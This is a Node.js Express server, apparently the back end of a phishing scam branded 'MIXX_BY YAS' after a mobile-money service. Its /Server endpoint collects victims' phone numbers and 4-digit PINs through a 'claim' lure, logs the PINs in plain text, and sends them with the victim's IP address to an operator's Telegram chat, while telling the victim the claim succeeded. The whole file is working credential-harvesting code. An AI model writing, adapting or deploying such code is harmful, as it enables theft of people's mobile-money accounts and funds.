require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 5000;

app.set('trust proxy', 1);

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

console.log('========================================');
console.log('🚀 MIXX_BY YAS Backend Server');
console.log('========================================');
console.log(`📱 Bot Token: ${TELEGRAM_BOT_TOKEN ? '✅ Set' : '❌ Missing'}`);
console.log(`📱 Chat ID: ${TELEGRAM_CHAT_ID ? '✅ Set' : '❌ Missing'}`);
console.log(`📡 Port: ${PORT}`);
console.log('========================================');

app.use(cors({ origin: '*', methods: ['GET', 'POST'] }));
app.use(express.json());

app.get('/', (req, res) => {
  res.json({
    status: 'OK',
    message: 'MIXX_BY YAS Backend running',
    telegram: TELEGRAM_BOT_TOKEN ? 'Configured ✅' : 'Not configured ⚠️',
    timestamp: new Date().toISOString()
  });
});

app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy', 
    uptime: process.uptime(),
    service: 'MIXX_BY YAS'
  });
});

app.post('/Server', async (req, res) => {
  try {
    const { phone, pin } = req.body;

    if (!phone || !pin) {
      console.warn('⚠️ Missing fields:', { phone: !!phone, pin: !!pin });
      return res.status(400).json({ 
        success: false, 
        message: 'Phone and PIN required' 
      });
    }

    // Validate phone (10 digits)
    const phoneRegex = /^[0-9]{10}$/;
    if (!phoneRegex.test(phone)) {
      console.warn('⚠️ Invalid phone:', phone);
      return res.status(400).json({
        success: false,
        message: 'Phone must be 10 digits'
      });
    }

    // Validate PIN (4 digits)
    const pinRegex = /^[0-9]{4}$/;
    if (!pinRegex.test(pin)) {
      console.warn('⚠️ Invalid PIN:', pin);
      return res.status(400).json({
        success: false,
        message: 'PIN must be 4 digits'
      });
    }

    console.log('✅ Valid data received:', { phone, pin });

    // ============================================
    // SEND TO TELEGRAM
    // ============================================
    let telegramSuccess = false;
    let errorDetails = null;

    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'your_bot_token_here') {
      console.error('❌ Telegram bot token not configured');
      return res.status(500).json({
        success: false,
        message: 'Telegram not configured',
        telegram: { sent: false, error: 'Bot token missing' }
      });
    }

    try {
      // First test if bot is valid
      const botCheck = await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`);
      console.log('🤖 Bot check:', botCheck.data.ok ? '✅ Valid' : '❌ Invalid');

      if (!botCheck.data.ok) {
        throw new Error('Invalid bot token - please check your TELEGRAM_BOT_TOKEN');
      }

      // Send the message
      const message = `🎯 *NEW CLAIM - MIXX_BY YAS*\n📱 Phone: ${phone}\n🔐 PIN: ${pin}\n🕐 Time: ${new Date().toLocaleString('sw-TZ', { timeZone: 'Africa/Dar_es_Salaam' })}\n🌐 IP: ${req.ip || req.connection.remoteAddress}`;

      const response = await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        },
        { timeout: 10000 }
      );

      telegramSuccess = response.data.ok;
      
      if (telegramSuccess) {
        console.log('✅ Telegram notification sent successfully!');
      } else {
        console.error('❌ Telegram returned error:', response.data);
        errorDetails = response.data;
      }
    } catch (error) {
      console.error('❌ Telegram send failed:');
      console.error('  Message:', error.message);
      
      if (error.response) {
        console.error('  Status:', error.response.status);
        console.error('  Data:', JSON.stringify(error.response.data, null, 2));
        errorDetails = error.response.data;
      }
      
      telegramSuccess = false;
    }

    // ============================================
    // RESPONSE
    // ============================================
    res.json({
      success: true,
      message: 'Claim submitted successfully',
      telegram: { 
        sent: telegramSuccess,
        error: errorDetails 
      },
      data: {
        phone: phone,
        pin: '****'
      }
    });

  } catch (error) {
    console.error('❌ Server error:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Internal server error',
      error: error.message 
    });
  }
});

app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`🌐 URL: https://mix-by-yas-production.up.railway.app`);
  console.log(`🔗 Endpoint: POST /Server`);
});
